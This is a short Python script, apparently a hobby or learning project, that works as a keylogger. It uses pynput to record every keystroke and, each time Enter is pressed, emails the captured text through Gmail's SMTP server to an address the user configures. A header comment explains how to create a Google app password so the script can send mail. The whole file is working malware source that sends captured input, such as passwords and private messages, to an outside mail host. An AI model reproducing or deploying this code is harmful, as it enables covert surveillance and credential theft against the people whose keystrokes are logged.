'''
Note: Email account and password is not incorporated for privacy reasons. 
For the email account you can edit the code to your own email adrress and the email address you want to send it to. 
For the password, you would need to go to this link: 
https://myaccount.google.com/u/2/?hl=en&utm_source=OGB&utm_medium=act. After doing so go to 'Security', then go to '2-Step Verification'. 
After you do so then you should then scroll down to 'App Passwords'. Click on 'Select app' -> 'Other(custom name)' -> and name it whatever you would like. 
Then click the 'generate' button and then copy paste the lengthy password google generates for you. 
'''


#imports
import os
import smtplib
import ssl
from email.message import EmailMessage
from pynput import keyboard

#where the email is being sent, recieved, and the password for it for google to authorize the message being sent
email_sender = 'your_email'#replace 'your_email' with whatever gmail you want 
email_password = "your_password"#replace 'your_password' with your password you have from notes above
email_receiver = 'your_email'#replace 'your_email' with whatever gmail you want 

subject = 'Keylogger Report' #the subject of the email, for readability
captured_keys = [] #list to store captured keys

#function to handle key presses 
def keyPressed(key):
    try:
        char = key.char #getting the character that is associated with the key 
        captured_keys.append(char) #appends character to the list
    except AttributeError:
        if key == keyboard.Key.space:
            captured_keys.append(' ')  #records the spaces for readability in the document
        #when the enter key is pressed then the program will run the second fucntion called 'send_email'
        elif key == keyboard.Key.enter:
            send_email()
        #if the user presses esc then the program will stop, 
        elif key == keyboard.Key.esc:
            return False

#a function that will collect all the characters logged by the keylogger and it will send to an email
def send_email():
    em = EmailMessage()
    em['From'] = email_sender
    em['To'] = email_receiver
    em['Subject'] = subject

    captured_text = ''.join(captured_keys) #converts the list of captured keys to a string
    em.set_content(captured_text) #makes the text(converted to a list of chars to a string) to the email content

    context = ssl.create_default_context() #encrypts the content fo the email

    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
        smtp.login(email_sender, email_password)
        smtp.sendmail(email_sender, email_receiver, em.as_string())

if __name__ == '__main__':
    listener = keyboard.Listener(on_press=keyPressed) #creates a keyboard listener
    listener.start() # captures the characters, the keys
    listener.join()
